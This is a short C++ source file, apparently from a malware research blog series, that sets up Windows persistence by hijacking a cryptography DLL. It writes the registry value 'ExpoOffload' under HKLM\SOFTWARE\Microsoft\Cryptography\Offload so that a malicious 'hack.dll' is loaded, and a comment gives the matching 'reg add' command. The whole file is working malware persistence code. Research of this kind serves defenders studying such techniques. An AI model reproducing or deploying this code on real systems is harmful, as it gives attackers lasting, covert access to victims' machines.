/*
pers.cpp
windows persistence via
hijacking cryptography DLL
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/21/malware-pers-16.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // reg path
  const char* path = "SOFTWARE\\Microsoft\\Cryptography\\Offload";

  // evil DLL
  const char* evil = "Z:\\2022-10-21-malware-pers-16\\hack.dll";

  // create key
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
  if (res == ERROR_SUCCESS) {
    // set registry key value
    // reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Offload" /v "ExpoOffload" /t REG_SZ /d "...\hack.dll" /f
    RegSetValueEx(hkey, (LPCSTR)"ExpoOffload", 0, REG_SZ, (unsigned char*)evil, strlen(evil));
    RegCloseKey(hkey);
  }

  return 0;
}
